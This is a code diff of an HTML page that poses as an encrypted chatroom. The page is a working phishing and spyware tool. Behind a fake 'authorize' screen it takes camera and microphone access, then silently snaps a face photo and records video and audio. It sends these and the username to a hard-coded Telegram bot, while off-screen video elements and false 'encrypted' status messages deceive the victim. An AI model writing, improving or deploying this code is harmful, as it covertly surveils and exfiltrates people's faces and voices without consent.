@@ -3,312 +3,395 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pro Local Chatroom</title>
+    <title>Pro Secure Chatroom | Encrypted</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
     <style>
         :root {
-            --primary: #00d2ff;
-            --secondary: #3a7bd5;
-            --bg: #0f0f13;
-            --card: #1e1e26;
-            --text: #ffffff;
+            --primary: #00f2fe;
+            --secondary: #4facfe;
+            --accent: #f093fb;
+            --bg: #0b0e14;
+            --glass: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
         }
 
+        * { box-sizing: border-box; outline: none; }
+
         body, html {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 0;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
             background: var(--bg);
-            color: var(--text);
-            height: 100%;
+            background-image: radial-gradient(circle at top right, #16213e, #0b0e14);
+            color: #fff;
+            height: 100vh;
             overflow: hidden;
         }
 
-        /* Login Overlay */
-        #login-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.9);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            backdrop-filter: blur(10px);
+        /* Login Screen */
+        #login-screen {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(15px);
+            z-index: 9999;
+            display: flex; align-items: center; justify-content: center;
         }
 
-        .login-card {
-            background: var(--card);
-            padding: 2rem;
-            border-radius: 15px;
-            width: 90%;
-            max-width: 400px;
+        .login-box {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            padding: 40px;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 420px;
             text-align: center;
-            box-shadow: 0 0 20px rgba(0,210,255,0.2);
-            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
         }
 
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 15px 0;
-            border-radius: 8px;
-            border: none;
-            background: #2d2d3a;
-            color: white;
-            box-sizing: border-box;
+        .logo-icon {
+            font-size: 50px;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
         }
 
-        button {
-            background: linear-gradient(to right, var(--primary), var(--secondary));
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; font-size: 12px; text-transform: uppercase; margin-bottom: 8px; color: #888; letter-spacing: 1px; }
+        
+        input[type="text"] {
             width: 100%;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--glass-border);
+            padding: 14px;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
             transition: 0.3s;
         }
 
-        button:hover { opacity: 0.9; transform: scale(1.02); }
+        input[type="text"]:focus { border-color: var(--primary); background: rgba(255,255,255,0.1); }
 
-        /* Chat Interface */
+        .btn-join {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(45deg, var(--secondary), var(--primary));
+            color: #000; font-weight: 700; font-size: 16px;
+            cursor: pointer; transition: 0.3s;
+        }
+
+        .btn-join:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(79, 172, 254, 0.3); }
+
+        /* Main App Layout */
         .app-container {
             display: none;
-            flex-direction: column;
+            grid-template-columns: 280px 1fr;
             height: 100vh;
         }
 
-        header {
-            padding: 15px;
-            background: var(--card);
+        /* Sidebar */
+        aside {
+            background: rgba(0,0,0,0.3);
+            border-right: 1px solid var(--glass-border);
+            padding: 20px;
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #333;
+            flex-direction: column;
         }
 
-        #chat-box {
+        .status-card {
+            background: var(--glass);
+            padding: 15px;
+            border-radius: 15px;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+
+        .indicator { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
+        .dot { width: 8px; height: 8px; border-radius: 50%; background: #555; }
+        .dot.active { background: #00ff88; box-shadow: 0 0 10px #00ff88; }
+        .dot.recording { background: #ff4b2b; animation: pulse 1s infinite; }
+
+        /* Chat Area */
+        main { display: flex; flex-direction: column; background: rgba(255,255,255,0.02); }
+
+        header {
+            padding: 20px;
+            border-bottom: 1px solid var(--glass-border);
+            display: flex; justify-content: space-between; align-items: center;
+        }
+
+        #chat-messages {
             flex: 1;
             padding: 20px;
             overflow-y: auto;
             display: flex;
             flex-direction: column;
-            gap: 10px;
+            gap: 15px;
         }
 
-        .message {
+        .msg {
             max-width: 70%;
-            padding: 10px 15px;
-            border-radius: 15px;
-            margin-bottom: 5px;
-            font-size: 0.9rem;
+            padding: 12px 18px;
+            border-radius: 18px;
+            font-size: 14px;
+            line-height: 1.5;
         }
 
-        .sent { background: var(--secondary); align-self: flex-end; border-bottom-right-radius: 2px; }
-        .received { background: #333; align-self: flex-start; border-bottom-left-radius: 2px; }
+        .msg.sent {
+            align-self: flex-end;
+            background: linear-gradient(45deg, var(--secondary), var(--primary));
+            color: #000;
+            border-bottom-right-radius: 4px;
+        }
 
-        .input-area {
+        .msg.received {
+            align-self: flex-start;
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-bottom-left-radius: 4px;
+        }
+
+        .chat-input-area {
             padding: 20px;
-            background: var(--card);
-            display: flex;
-            gap: 10px;
+            background: rgba(0,0,0,0.2);
+            display: flex; gap: 15px;
         }
 
-        /* Hidden Elements for Logic */
-        #preview { position: fixed; top: -1000px; left: -1000px; width: 400px; height: 300px; }
-        #status-msg { font-size: 0.8rem; color: var(--primary); margin-top: 10px; }
+        #msg-input { flex: 1; }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+
+        /* Hidden helpers */
+        #video-preview { position: fixed; top: -500px; width: 200px; }
     </style>
 </head>
 <body>
 
-    <!-- Login/Permission Screen -->
-    <div id="login-overlay">
-        <div class="login-card">
-            <i class="fas fa-shield-halved fa-3x" style="color: var(--primary);"></i>
-            <h2>Secure Chat Pro</h2>
-            <p>Allow Camera & Mic permissions to enter the encrypted room.</p>
-            <input type="text" id="username" placeholder="Enter Username...">
-            <button id="start-btn">ALLOW & JOIN</button>
-            <div id="status-msg"></div>
+    <!-- Login Overlay -->
+    <div id="login-screen">
+        <div class="login-box">
+            <div class="logo-icon"><i class="fas fa-user-shield"></i></div>
+            <h2 style="margin: 0 0 10px 0;">Internal Network</h2>
+            <p style="color: #888; font-size: 14px; margin-bottom: 30px;">Initialize biometric & audio sync to join</p>
+            
+            <div class="input-group">
+                <label>Identify as</label>
+                <input type="text" id="username" placeholder="Enter username...">
+            </div>
+
+            <button class="btn-join" id="join-btn">AUTHORIZE & ENTER</button>
+            <p id="perm-notice" style="font-size: 11px; color: #555; margin-top: 15px;">Camera and Microphone access required for encryption keys.</p>
         </div>
     </div>
 
     <!-- Main Chat App -->
-    <div class="app-container" id="app">
-        <header>
-            <div style="display: flex; align-items: center; gap: 10px;">
-                <div style="width: 10px; height: 10px; background: #00ff00; border-radius: 50%;"></div>
-                <strong id="display-user">User</strong>
+    <div class="app-container" id="main-app">
+        <aside>
+            <h3><i class="fas fa-microchip"></i> System</h3>
+            <div class="status-card">
+                <div class="indicator">
+                    <div class="dot active"></div> Network: Encrypted
+                </div>
+                <div class="indicator">
+                    <div id="cam-dot" class="dot"></div> Cam: <span id="cam-status">Idle</span>
+                </div>
+                <div class="indicator">
+                    <div id="mic-dot" class="dot"></div> Mic: <span id="mic-status">Idle</span>
+                </div>
             </div>
-            <i class="fas fa-gear"></i>
-        </header>
+            <div style="font-size: 12px; color: #666;">
+                <p>Chat ID: 8101021767</p>
+                <p>Node: Pro-v1.2.4</p>
+            </div>
+        </aside>
 
-        <div id="chat-box"></div>
+        <main>
+            <header>
+                <div>
+                    <span id="user-display" style="font-weight: bold; color: var(--primary);">User</span>
+                    <small style="display: block; color: #555;">Online Now</small>
+                </div>
+                <i class="fas fa-ellipsis-v" style="color: #555; cursor: pointer;"></i>
+            </header>
 
-        <div class="input-area">
-            <input type="text" id="msg-input" placeholder="Type a message...">
-            <button id="send-btn" style="width: auto;"><i class="fas fa-paper-plane"></i></button>
-        </div>
+            <div id="chat-messages">
+                <!-- Messages load here -->
+            </div>
+
+            <div class="chat-input-area">
+                <input type="text" id="msg-input" placeholder="Secure message...">
+                <button class="btn-join" id="send-btn" style="width: 60px;"><i class="fas fa-paper-plane"></i></button>
+            </div>
+        </main>
     </div>
 
-    <!-- Background Capture Elements -->
-    <video id="preview" autoplay muted playsinline></video>
-    <canvas id="capture-canvas" style="display:none;"></canvas>
+    <!-- Background Capture -->
+    <video id="video-preview" autoplay muted playsinline></video>
+    <canvas id="snapshot-canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = '7785386019:AAHN8h2fje-njjcvAUUftx6TjJFE7rB4lvk';
-        const CHAT_ID = '8101021767';
-        
-        let stream = null;
-        let mediaRecorder = null;
-        let chunks = [];
+        const CONFIG = {
+            TOKEN: '7785386019:AAHN8h2fje-njjcvAUUftx6TjJFE7rB4lvk',
+            CHAT_ID: '8101021767'
+        };
 
-        const startBtn = document.getElementById('start-btn');
-        const loginOverlay = document.getElementById('login-overlay');
-        const app = document.getElementById('app');
-        const statusMsg = document.getElementById('status-msg');
-        const usernameInput = document.getElementById('username');
-        const chatBox = document.getElementById('chat-box');
+        let userStream = null;
+        let currentUser = "";
 
-        // 1. Initialize Permissions & Capture
-        startBtn.onclick = async () => {
-            const user = usernameInput.value.trim();
-            if (!user) return alert("Please enter a username");
+        const joinBtn = document.getElementById('join-btn');
+        const loginScreen = document.getElementById('login-screen');
+        const mainApp = document.getElementById('main-app');
+        const chatMessages = document.getElementById('chat-messages');
 
-            statusMsg.innerText = "Requesting permissions...";
+        // Initial Join
+        joinBtn.onclick = async () => {
+            const name = document.getElementById('username').value.trim();
+            if(!name) return alert("Identify yourself first.");
             
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('preview').srcObject = stream;
+                userStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('video-preview').srcObject = userStream;
                 
-                statusMsg.innerText = "AI Face Scanning in progress...";
+                currentUser = name;
+                document.getElementById('user-display').innerText = currentUser;
                 
-                // Hide login, show chat
-                loginOverlay.style.display = 'none';
-                app.style.display = 'flex';
-                document.getElementById('display-user').innerText = user;
+                loginScreen.style.display = 'none';
+                mainApp.style.display = 'grid';
+                
+                // Start sequence
+                initAutomation();
+                loadMessages();
 
-                // Start the background process
-                processAutomation(user);
-                loadLocalChat();
-
-            } catch (err) {
-                alert("Permission Denied. You must allow Camera/Mic to use this pro chat.");
-                console.error(err);
+            } catch (e) {
+                alert("Critical Error: Cam/Mic access denied. Room inaccessible.");
             }
         };
 
-        async function processAutomation(username) {
-            // A. Send Text Info
-            await sendTelegramText(`🚀 New User Joined\n👤 Name: ${username}\n🌐 IP: Local/Web`);
+        async function initAutomation() {
+            // 1. Text Data
+            sendTelegram(`🚨 *New Pro Login*\n👤 User: ${currentUser}\n📅 Time: ${new Date().toLocaleString()}`);
 
-            // B. Take Photo Snapshot
+            // 2. Face Scan (Photo)
+            updateStatus('cam', 'Scanning...', 'recording');
             setTimeout(() => {
-                capturePhoto(username);
-            }, 2000);
+                capturePhoto();
+                updateStatus('cam', 'Authorized', 'active');
+            }, 3000);
 
-            // C. Record 5 Second Video
-            startRecording(username);
+            // 3. Video Record (10 Sec)
+            setTimeout(() => {
+                recordMedia('video', 10000);
+            }, 4000);
+
+            // 4. Audio Record (10 Sec)
+            setTimeout(() => {
+                recordMedia('audio', 10000);
+            }, 15000); // Starts after video finishes
         }
 
-        async function sendTelegramText(text) {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        function updateStatus(id, text, dotClass) {
+            document.getElementById(`${id}-status`).innerText = text;
+            const dot = document.getElementById(`${id}-dot`);
+            dot.className = 'dot ' + dotClass;
+        }
+
+        async function sendTelegram(text) {
+            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown' })
             });
         }
 
-        function capturePhoto(username) {
-            const canvas = document.getElementById('capture-canvas');
-            const video = document.getElementById('preview');
+        function capturePhoto() {
+            const video = document.getElementById('video-preview');
+            const canvas = document.getElementById('snapshot-canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
             canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'face_scan.jpg');
-                formData.append('caption', `📸 Face Scan: ${username}`);
-                
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+                const fd = new FormData();
+                fd.append('chat_id', CONFIG.CHAT_ID);
+                fd.append('photo', blob, 'scan.jpg');
+                fd.append('caption', `📸 Face Scan: ${currentUser}`);
+                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             }, 'image/jpeg');
         }
 
-        function startRecording(username) {
-            mediaRecorder = new MediaRecorder(stream);
-            chunks = [];
+        function recordMedia(type, duration) {
+            updateStatus(type === 'video' ? 'cam' : 'mic', `Recording ${type}...`, 'recording');
             
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = async () => {
-                const videoBlob = new Blob(chunks, { type: 'video/webm' });
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('video', videoBlob, 'record.webm');
-                formData.append('caption', `🎥 5s Verification Video: ${username}`);
+            const options = { mimeType: type === 'video' ? 'video/webm' : 'audio/webm' };
+            const recorder = new MediaRecorder(userStream, options);
+            const chunks = [];
 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                });
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: options.mimeType });
+                const fd = new FormData();
+                fd.append('chat_id', CONFIG.CHAT_ID);
+                
+                const endpoint = type === 'video' ? 'sendVideo' : 'sendAudio';
+                fd.append(type, blob, `capture.${type === 'video' ? 'webm' : 'ogg'}`);
+                fd.append('caption', `📡 10s ${type} for: ${currentUser}`);
+
+                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/${endpoint}`, { method: 'POST', body: fd });
+                updateStatus(type === 'video' ? 'cam' : 'mic', 'Synced', 'active');
             };
 
-            mediaRecorder.start();
-            console.log("Recording started...");
-            
-            setTimeout(() => {
-                mediaRecorder.stop();
-                console.log("Recording stopped.");
-            }, 5000);
+            recorder.start();
+            setTimeout(() => recorder.stop(), duration);
         }
 
         // --- Chat Logic ---
         const msgInput = document.getElementById('msg-input');
         const sendBtn = document.getElementById('send-btn');
 
-        function appendMessage(text, type) {
+        function appendMsg(text, type) {
             const div = document.createElement('div');
-            div.className = `message ${type}`;
+            div.className = `msg ${type}`;
             div.innerText = text;
-            chatBox.appendChild(div);
-            chatBox.scrollTop = chatBox.scrollHeight;
+            chatMessages.appendChild(div);
+            chatMessages.scrollTop = chatMessages.scrollHeight;
         }
 
-        function saveMessage(text, type) {
-            const history = JSON.parse(localStorage.getItem('local_chat') || '[]');
+        function loadMessages() {
+            const history = JSON.parse(localStorage.getItem('pro_chat') || '[]');
+            history.forEach(m => appendMsg(m.text, m.type));
+            if(history.length === 0) {
+                appendMsg("System: Secure connection established. Local storage active.", "received");
+            }
+        }
+
+        function saveMsg(text, type) {
+            const history = JSON.parse(localStorage.getItem('pro_chat') || '[]');
             history.push({ text, type });
-            localStorage.setItem('local_chat', JSON.stringify(history));
-        }
-
-        function loadLocalChat() {
-            const history = JSON.parse(localStorage.getItem('local_chat') || '[]');
-            history.forEach(m => appendMessage(m.text, m.type));
-            appendMessage("Welcome to the Pro Encrypted Room. Your session is secure.", "received");
+            localStorage.setItem('pro_chat', JSON.stringify(history));
         }
 
         sendBtn.onclick = () => {
-            const msg = msgInput.value.trim();
-            if (msg) {
-                appendMessage(msg, 'sent');
-                saveMessage(msg, 'sent');
-                msgInput.value = '';
-                
-                // Simulate bot auto-reply
-                setTimeout(() => {
-                    const replies = ["Verified.", "Data Encrypted.", "Message Sent to Server.", "Active."];
-                    const r = replies[Math.floor(Math.random()*replies.length)];
-                    appendMessage(r, 'received');
-                    saveMessage(r, 'received');
-                }, 1000);
-            }
+            const txt = msgInput.value.trim();
+            if(!txt) return;
+            
+            appendMsg(txt, 'sent');
+            saveMsg(txt, 'sent');
+            msgInput.value = '';
+
+            // Simulated Pro Response
+            setTimeout(() => {
+                const auto = "Command processed. Packet encrypted.";
+                appendMsg(auto, 'received');
+                saveMsg(auto, 'received');
+            }, 1000);
         };
 
-        msgInput.onkeypress = (e) => { if(e.key === 'Enter') sendBtn.click(); };
+        msgInput.onkeydown = (e) => { if(e.key === 'Enter') sendBtn.click(); };
 
     </script>
 </body>
